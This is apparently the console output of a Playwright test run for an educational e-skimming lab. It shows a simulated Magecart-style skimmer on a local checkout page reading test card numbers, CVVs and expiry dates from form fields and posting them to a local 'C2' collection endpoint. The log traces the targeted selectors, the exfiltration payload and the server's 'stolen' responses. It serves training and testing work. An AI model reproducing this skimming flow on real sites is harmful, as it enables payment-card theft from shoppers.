@@ -1,0 +1,498 @@
+
+> e-skimming-lab-tests@1.0.0 test
+> playwright test
+
+🧪 Test Environment: local
+📍 Home Index: http://localhost:3000
+📍 Lab 1 Vulnerable: http://localhost:9001
+📍 Lab 1 C2: http://localhost:9002
+🧪 Running tests for variant: base
+📋 Test files: checkout.spec.js
+🌍 Environment: local
+🔗 Base URL: http://localhost:9001
+🧪 Test environment: local
+📍 C2 API URL: http://localhost:9002/api/stolen
+📍 C2 Collect URL: http://localhost:9002/collect
+
+Running 3 tests using 3 workers
+
+[1A[2K🧪 Test Environment: local
+
+[1A[2K📍 Home Index: http://localhost:3000
+
+[1A[2K📍 Lab 1 Vulnerable: http://localhost:9001
+
+[1A[2K📍 Lab 1 C2: http://localhost:9002
+
+[1A[2K🧪 Running tests for variant: base
+
+[1A[2K📋 Test files: checkout.spec.js
+
+[1A[2K🌍 Environment: local
+
+[1A[2K🔗 Base URL: http://localhost:9001
+
+[1A[2K🧪 Test Environment: local
+
+[1A[2K📍 Home Index: http://localhost:3000
+
+[1A[2K📍 Lab 1 Vulnerable: http://localhost:9001
+
+[1A[2K📍 Lab 1 C2: http://localhost:9002
+
+[1A[2K🧪 Running tests for variant: base
+
+[1A[2K📋 Test files: checkout.spec.js
+
+[1A[2K🌍 Environment: local
+
+[1A[2K🔗 Base URL: http://localhost:9001
+
+[1A[2K🧪 Test environment: local
+
+[1A[2K📍 C2 API URL: http://localhost:9002/api/stolen
+
+[1A[2K📍 C2 Collect URL: http://localhost:9002/collect
+
+[1A[2K🧪 Test environment: local
+
+[1A[2K📍 C2 API URL: http://localhost:9002/api/stolen
+
+[1A[2K📍 C2 Collect URL: http://localhost:9002/collect
+
+[1A[2K🧪 Test Environment: local
+
+[1A[2K📍 Home Index: http://localhost:3000
+
+[1A[2K📍 Lab 1 Vulnerable: http://localhost:9001
+
+[1A[2K📍 Lab 1 C2: http://localhost:9002
+
+[1A[2K🧪 Running tests for variant: base
+
+[1A[2K📋 Test files: checkout.spec.js
+
+[1A[2K🌍 Environment: local
+
+[1A[2K🔗 Base URL: http://localhost:9001
+
+[1A[2K[1/3] [chromium] › tests/checkout.spec.js:148:3 › E-Skimming Lab - Checkout Flow › should capture console logs from skimmer
+[1A[2K[2/3] [chromium] › tests/checkout.spec.js:49:3 › E-Skimming Lab - Checkout Flow › should complete checkout and trigger skimmer
+[1A[2K🧪 Test environment: local
+
+[1A[2K📍 C2 API URL: http://localhost:9002/api/stolen
+
+[1A[2K📍 C2 Collect URL: http://localhost:9002/collect
+
+[1A[2K[3/3] [chromium] › tests/checkout.spec.js:190:3 › E-Skimming Lab - Checkout Flow › should make network request to C2 server
+[1A[2K[chromium] › tests/checkout.spec.js:49:3 › E-Skimming Lab - Checkout Flow › should complete checkout and trigger skimmer
+🚀 Starting checkout test...
+
+[1A[2K📝 Filling out checkout form...
+
+[1A[2K[chromium] › tests/checkout.spec.js:148:3 › E-Skimming Lab - Checkout Flow › should capture console logs from skimmer
+🔍 SKIMMER LOG: [SKIMMER] Initializing skimmer... 
+
+[1A[2K[chromium] › tests/checkout.spec.js:190:3 › E-Skimming Lab - Checkout Flow › should make network request to C2 server
+🔍 SKIMMER LOG: [SKIMMER] Initializing skimmer... 
+
+[1A[2K[chromium] › tests/checkout.spec.js:148:3 › E-Skimming Lab - Checkout Flow › should capture console logs from skimmer
+🔍 SKIMMER LOG: [SKIMMER] Payment form found, attaching skimmer 
+
+[1A[2K[chromium] › tests/checkout.spec.js:190:3 › E-Skimming Lab - Checkout Flow › should make network request to C2 server
+🔍 SKIMMER LOG: [SKIMMER] Payment form found, attaching skimmer 
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Form element: JSHandle@node
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Form fields found: 4
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Skimmer ready and listening 
+
+[1A[2K[chromium] › tests/checkout.spec.js:148:3 › E-Skimming Lab - Checkout Flow › should capture console logs from skimmer
+🔍 SKIMMER LOG: [SKIMMER] Form element: JSHandle@node
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Form fields found: 4
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Skimmer ready and listening 
+
+[1A[2K[chromium] › tests/checkout.spec.js:49:3 › E-Skimming Lab - Checkout Flow › should complete checkout and trigger skimmer
+🔍 SKIMMER LOG: [SKIMMER] Initializing skimmer... 
+
+[1A[2K✅ Form filled, submitting...
+
+[1A[2K[chromium] › tests/checkout.spec.js:148:3 › E-Skimming Lab - Checkout Flow › should capture console logs from skimmer
+🔍 SKIMMER LOG: [SKIMMER] Form submission detected 
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Event: SubmitEvent
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Extracting card data from form fields... 
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Searching for field with selectors: [#card-number, [name="cardNumber"]]
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Selector "#card-number": found element with value "4000 0000 0000 0002"
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Searching for field with selectors: [#cvv, [name="cvv"]]
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Selector "#cvv": found element with value "456"
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Searching for field with selectors: [#expiry, [name="expiry"]]
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Selector "#expiry": found element with value "06/29"
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Searching for field with selectors: [#cardholder-name, [name="cardholderName"]]
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Selector "#cardholder-name": not found
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Selector "[name="cardholderName"]": not found
+
+[1A[2K[chromium] › tests/checkout.spec.js:49:3 › E-Skimming Lab - Checkout Flow › should complete checkout and trigger skimmer
+🔍 SKIMMER LOG: [SKIMMER] Payment form found, attaching skimmer 
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Form element: JSHandle@node
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Form fields found: 4
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Skimmer ready and listening 
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Form submission detected 
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Event: SubmitEvent
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Extracting card data from form fields... 
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Searching for field with selectors: [#card-number, [name="cardNumber"]]
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Selector "#card-number": found element with value "4000 0000 0000 0002"
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Searching for field with selectors: [#cvv, [name="cvv"]]
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Selector "#cvv": found element with value "123"
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Searching for field with selectors: [#expiry, [name="expiry"]]
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Selector "#expiry": found element with value "12/28"
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Searching for field with selectors: [#cardholder-name, [name="cardholderName"]]
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Selector "#cardholder-name": not found
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Selector "[name="cardholderName"]": not found
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Searching for field with selectors: [#billing-address, [name="billingAddress"]]
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Selector "#billing-address": not found
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Selector "[name="billingAddress"]": not found
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Searching for field with selectors: [#city, [name="city"]]
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Selector "#city": not found
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Selector "[name="city"]": not found
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Searching for field with selectors: [#zip, [name="zip"]]
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Selector "#zip": not found
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Selector "[name="zip"]": not found
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Searching for field with selectors: [#country, [name="country"]]
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Selector "#country": not found
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Selector "[name="country"]": not found
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Searching for field with selectors: [#email, [name="email"]]
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Selector "#email": not found
+
+[1A[2K[chromium] › tests/checkout.spec.js:148:3 › E-Skimming Lab - Checkout Flow › should capture console logs from skimmer
+🔍 SKIMMER LOG: [SKIMMER] Searching for field with selectors: [#billing-address, [name="billingAddress"]]
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Selector "#billing-address": not found
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Selector "[name="billingAddress"]": not found
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Searching for field with selectors: [#city, [name="city"]]
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Selector "#city": not found
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Selector "[name="city"]": not found
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Searching for field with selectors: [#zip, [name="zip"]]
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Selector "#zip": not found
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Selector "[name="zip"]": not found
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Searching for field with selectors: [#country, [name="country"]]
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Selector "#country": not found
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Selector "[name="country"]": not found
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Searching for field with selectors: [#email, [name="email"]]
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Selector "#email": not found
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Selector "[name="email"]": not found
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Searching for field with selectors: [#phone, [name="phone"]]
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Selector "#phone": not found
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Selector "[name="phone"]": not found
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Extracted data: {cardNumber: 4000 0000 0000 0002, cvv: 456, expiry: 06/29, cardholderName: , billingAddress: }
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Valid card data found, preparing exfiltration 
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Exfiltrating data to C2 server: {cardNumber: 4000 0000 0000 0002, cvv: 456, expiry: 06/29, cardholderName: , billingAddress: }
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Target URL: http://localhost:9002/collect
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Data size: 416
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Request body: {"cardNumber":"4000 0000 0000 0002","cvv":"456","expiry":"06/29","cardholderName":"","billingAddress":"","city":"","zip":"","country":"","email":"","phone":"","metadata":{"url":"http://localhost:9001/checkout.html","timestamp":"2025-11-11T14:02:57.327Z","userAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.7339.186 Safari/537.36","screenResolution":"1280x720"}}
+
+[1A[2K[chromium] › tests/checkout.spec.js:49:3 › E-Skimming Lab - Checkout Flow › should complete checkout and trigger skimmer
+🔍 SKIMMER LOG: [SKIMMER] Selector "[name="email"]": not found
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Searching for field with selectors: [#phone, [name="phone"]]
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Selector "#phone": not found
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Selector "[name="phone"]": not found
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Extracted data: {cardNumber: 4000 0000 0000 0002, cvv: 123, expiry: 12/28, cardholderName: , billingAddress: }
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Valid card data found, preparing exfiltration 
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Exfiltrating data to C2 server: {cardNumber: 4000 0000 0000 0002, cvv: 123, expiry: 12/28, cardholderName: , billingAddress: }
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Target URL: http://localhost:9002/collect
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Data size: 416
+
+[1A[2K[chromium] › tests/checkout.spec.js:148:3 › E-Skimming Lab - Checkout Flow › should capture console logs from skimmer
+🌐 REQUEST TO C2: {
+  url: [32m'http://localhost:9002/collect'[39m,
+  method: [32m'POST'[39m,
+  headers: {
+    [32m'sec-ch-ua-platform'[39m: [32m'"Windows"'[39m,
+    referer: [32m'http://localhost:9001/'[39m,
+    [32m'user-agent'[39m: [32m'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.7339.186 Safari/537.36'[39m,
+    [32m'sec-ch-ua'[39m: [32m'"Chromium";v="140", "Not=A?Brand";v="24", "HeadlessChrome";v="140"'[39m,
+    [32m'content-type'[39m: [32m'application/json'[39m,
+    [32m'sec-ch-ua-mobile'[39m: [32m'?0'[39m,
+    [32m'accept-language'[39m: [32m'en-US'[39m
+  },
+  postData: [32m'{"cardNumber":"4000 0000 0000 0002","cvv":"456","expiry":"06/29","cardholderName":"","billingAddress":"","city":"","zip":"","country":"","email":"","phone":"","metadata":{"url":"http://localhost:9001/checkout.html","timestamp":"2025-11-11T14:02:57.327Z","userAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.7339.186 Safari/537.36","screenResolution":"1280x720"}}'[39m
+}
+
+[1A[2K[chromium] › tests/checkout.spec.js:49:3 › E-Skimming Lab - Checkout Flow › should complete checkout and trigger skimmer
+🔍 SKIMMER LOG: [SKIMMER] Request body: {"cardNumber":"4000 0000 0000 0002","cvv":"123","expiry":"12/28","cardholderName":"","billingAddress":"","city":"","zip":"","country":"","email":"","phone":"","metadata":{"url":"http://localhost:9001/checkout.html","timestamp":"2025-11-11T14:02:57.423Z","userAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.7339.186 Safari/537.36","screenResolution":"1280x720"}}
+
+[1A[2K🌐 REQUEST TO C2: {
+  url: [32m'http://localhost:9002/collect'[39m,
+  method: [32m'POST'[39m,
+  headers: {
+    [32m'sec-ch-ua-platform'[39m: [32m'"Windows"'[39m,
+    referer: [32m'http://localhost:9001/'[39m,
+    [32m'user-agent'[39m: [32m'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.7339.186 Safari/537.36'[39m,
+    [32m'sec-ch-ua'[39m: [32m'"Chromium";v="140", "Not=A?Brand";v="24", "HeadlessChrome";v="140"'[39m,
+    [32m'content-type'[39m: [32m'application/json'[39m,
+    [32m'sec-ch-ua-mobile'[39m: [32m'?0'[39m,
+    [32m'accept-language'[39m: [32m'en-US'[39m
+  },
+  postData: [32m'{"cardNumber":"4000 0000 0000 0002","cvv":"123","expiry":"12/28","cardholderName":"","billingAddress":"","city":"","zip":"","country":"","email":"","phone":"","metadata":{"url":"http://localhost:9001/checkout.html","timestamp":"2025-11-11T14:02:57.423Z","userAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.7339.186 Safari/537.36","screenResolution":"1280x720"}}'[39m
+}
+
+[1A[2K📥 RESPONSE FROM C2: {
+  url: [32m'http://localhost:9002/collect'[39m,
+  status: [33m200[39m,
+  headers: {
+    etag: [32m'W/"36-Vees5+tipwAO4CQJIZU3vaxhBEQ"'[39m,
+    connection: [32m'keep-alive'[39m,
+    [32m'access-control-allow-origin'[39m: [32m'*'[39m,
+    [32m'content-length'[39m: [32m'54'[39m,
+    [32m'keep-alive'[39m: [32m'timeout=5'[39m,
+    date: [32m'Tue, 11 Nov 2025 14:02:57 GMT'[39m,
+    [32m'content-type'[39m: [32m'application/json; charset=utf-8'[39m,
+    [32m'x-powered-by'[39m: [32m'Express'[39m
+  }
+}
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Fetch response status: 200
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Fetch response headers: {content-length: 54, content-type: application/json; charset=utf-8}
+
+[1A[2K[chromium] › tests/checkout.spec.js:148:3 › E-Skimming Lab - Checkout Flow › should capture console logs from skimmer
+📥 RESPONSE FROM C2: {
+  url: [32m'http://localhost:9002/collect'[39m,
+  status: [33m200[39m,
+  headers: {
+    etag: [32m'W/"36-1JpbvXVXEL5h3vI6/htX11KpqYI"'[39m,
+    connection: [32m'keep-alive'[39m,
+    [32m'access-control-allow-origin'[39m: [32m'*'[39m,
+    [32m'content-length'[39m: [32m'54'[39m,
+    [32m'keep-alive'[39m: [32m'timeout=5'[39m,
+    date: [32m'Tue, 11 Nov 2025 14:02:57 GMT'[39m,
+    [32m'content-type'[39m: [32m'application/json; charset=utf-8'[39m,
+    [32m'x-powered-by'[39m: [32m'Express'[39m
+  }
+}
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Fetch response status: 200
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Fetch response headers: {content-length: 54, content-type: application/json; charset=utf-8}
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Fetch response body: {"status":"ok","id":"stolen_2025-11-11T14-02-57-535Z"}
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Data successfully exfiltrated 
+
+[1A[2K[chromium] › tests/checkout.spec.js:49:3 › E-Skimming Lab - Checkout Flow › should complete checkout and trigger skimmer
+🔍 SKIMMER LOG: [SKIMMER] Fetch response body: {"status":"ok","id":"stolen_2025-11-11T14-02-57-556Z"}
+
+[1A[2K🔍 SKIMMER LOG: [SKIMMER] Data successfully exfiltrated 
+
+[1A[2K✅ Form submitted successfully
+
+[1A[2K🔍 Waiting for data to be exfiltrated to C2 server...
+
+[1A[2K📊 Attempt 1/10: Found 68 stolen data records
+
+[1A[2K✅ Test credit card data found in C2 server!
+
+[1A[2K✅ Test credit card data verified: { cardNumber: [32m'4000 0000 0000 0002'[39m, cvv: [32m'***'[39m, expiry: [32m'12/28'[39m }
+
+[1A[2K🔍 Test completed - data successfully exfiltrated to C2 server
+
+[1A[2K[chromium] › tests/checkout.spec.js:190:3 › E-Skimming Lab - Checkout Flow › should make network request to C2 server
+🌐 Network requests captured: [33m0[39m
+
+[1A[2K  1) [chromium] › tests/checkout.spec.js:190:3 › E-Skimming Lab - Checkout Flow › should make network request to C2 server 
+
+    Error: [2mexpect([22m[31mreceived[39m[2m).[22mtoBeGreaterThan[2m([22m[32mexpected[39m[2m)[22m
+
+    Expected: > [32m0[39m
+    Received:   [31m0[39m
+
+      233 |
+      234 |     // Verify network request was made
+    > 235 |     expect(networkRequests.length).toBeGreaterThan(0)
+          |                                    ^
+      236 |
+      237 |     // Verify data was exfiltrated to C2 server
+      238 |     console.log('🔍 Verifying data exfiltration to C2 server...')
+        at /Users/kestenbroughton/projectos/e-skimming-labs/labs/01-basic-magecart/test/tests/checkout.spec.js:235:36
+
+    attachment #1: screenshot (image/png) ──────────────────────────────────────────────────────────
+    test-results/checkout-E-Skimming-Lab----9d56e-etwork-request-to-C2-server-chromium/test-failed-1.png
+    ────────────────────────────────────────────────────────────────────────────────────────────────
+
+    attachment #2: video (video/webm) ──────────────────────────────────────────────────────────────
+    test-results/checkout-E-Skimming-Lab----9d56e-etwork-request-to-C2-server-chromium/video.webm
+    ────────────────────────────────────────────────────────────────────────────────────────────────
+
+    Error Context: test-results/checkout-E-Skimming-Lab----9d56e-etwork-request-to-C2-server-chromium/error-context.md
+
+
+[1A[2K[chromium] › tests/checkout.spec.js:148:3 › E-Skimming Lab - Checkout Flow › should capture console logs from skimmer
+📊 Captured skimmer logs: [33m45[39m
+
+[1A[2K🔍 [SKIMMER] Initializing skimmer... 
+
+[1A[2K🔍 [SKIMMER] Payment form found, attaching skimmer 
+
+[1A[2K🔍 [SKIMMER] Form element: JSHandle@node
+
+[1A[2K🔍 [SKIMMER] Form fields found: 4
+
+[1A[2K🔍 [SKIMMER] Skimmer ready and listening 
+
+[1A[2K🔍 [SKIMMER] Form submission detected 
+
+[1A[2K🔍 [SKIMMER] Event: SubmitEvent
+
+[1A[2K🔍 [SKIMMER] Extracting card data from form fields... 
+
+[1A[2K🔍 [SKIMMER] Searching for field with selectors: [#card-number, [name="cardNumber"]]
+
+[1A[2K🔍 [SKIMMER] Selector "#card-number": found element with value "4000 0000 0000 0002"
+
+[1A[2K🔍 [SKIMMER] Searching for field with selectors: [#cvv, [name="cvv"]]
+
+[1A[2K🔍 [SKIMMER] Selector "#cvv": found element with value "456"
+
+[1A[2K🔍 [SKIMMER] Searching for field with selectors: [#expiry, [name="expiry"]]
+
+[1A[2K🔍 [SKIMMER] Selector "#expiry": found element with value "06/29"
+
+[1A[2K🔍 [SKIMMER] Searching for field with selectors: [#cardholder-name, [name="cardholderName"]]
+
+[1A[2K🔍 [SKIMMER] Selector "#cardholder-name": not found
+
+[1A[2K🔍 [SKIMMER] Selector "[name="cardholderName"]": not found
+
+[1A[2K🔍 [SKIMMER] Searching for field with selectors: [#billing-address, [name="billingAddress"]]
+
+[1A[2K🔍 [SKIMMER] Selector "#billing-address": not found
+
+[1A[2K🔍 [SKIMMER] Selector "[name="billingAddress"]": not found
+
+[1A[2K🔍 [SKIMMER] Searching for field with selectors: [#city, [name="city"]]
+
+[1A[2K🔍 [SKIMMER] Selector "#city": not found
+
+[1A[2K🔍 [SKIMMER] Selector "[name="city"]": not found
+
+[1A[2K🔍 [SKIMMER] Searching for field with selectors: [#zip, [name="zip"]]
+
+[1A[2K🔍 [SKIMMER] Selector "#zip": not found
+
+[1A[2K🔍 [SKIMMER] Selector "[name="zip"]": not found
+
+[1A[2K🔍 [SKIMMER] Searching for field with selectors: [#country, [name="country"]]
+
+[1A[2K🔍 [SKIMMER] Selector "#country": not found
+
+[1A[2K🔍 [SKIMMER] Selector "[name="country"]": not found
+
+[1A[2K🔍 [SKIMMER] Searching for field with selectors: [#email, [name="email"]]
+
+[1A[2K🔍 [SKIMMER] Selector "#email": not found
+
+[1A[2K🔍 [SKIMMER] Selector "[name="email"]": not found
+
+[1A[2K🔍 [SKIMMER] Searching for field with selectors: [#phone, [name="phone"]]
+
+[1A[2K🔍 [SKIMMER] Selector "#phone": not found
+
+[1A[2K🔍 [SKIMMER] Selector "[name="phone"]": not found
+
+[1A[2K🔍 [SKIMMER] Extracted data: {cardNumber: 4000 0000 0000 0002, cvv: 456, expiry: 06/29, cardholderName: , billingAddress: }
+
+[1A[2K🔍 [SKIMMER] Valid card data found, preparing exfiltration 
+
+[1A[2K🔍 [SKIMMER] Exfiltrating data to C2 server: {cardNumber: 4000 0000 0000 0002, cvv: 456, expiry: 06/29, cardholderName: , billingAddress: }
+
+[1A[2K🔍 [SKIMMER] Target URL: http://localhost:9002/collect
+
+[1A[2K🔍 [SKIMMER] Data size: 416
+
+[1A[2K🔍 [SKIMMER] Request body: {"cardNumber":"4000 0000 0000 0002","cvv":"456","expiry":"06/29","cardholderName":"","billingAddress":"","city":"","zip":"","country":"","email":"","phone":"","metadata":{"url":"http://localhost:9001/checkout.html","timestamp":"2025-11-11T14:02:57.327Z","userAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.7339.186 Safari/537.36","screenResolution":"1280x720"}}
+
+[1A[2K🔍 [SKIMMER] Fetch response status: 200
+
+[1A[2K🔍 [SKIMMER] Fetch response headers: {content-length: 54, content-type: application/json; charset=utf-8}
+
+[1A[2K🔍 [SKIMMER] Fetch response body: {"status":"ok","id":"stolen_2025-11-11T14-02-57-535Z"}
+
+[1A[2K🔍 [SKIMMER] Data successfully exfiltrated 
+
+[1A[2K  1 failed
+    [chromium] › tests/checkout.spec.js:190:3 › E-Skimming Lab - Checkout Flow › should make network request to C2 server 
+  2 passed (6.7s)
+
+[36m  Serving HTML report at http://localhost:52715. Press Ctrl+C to quit.[39m
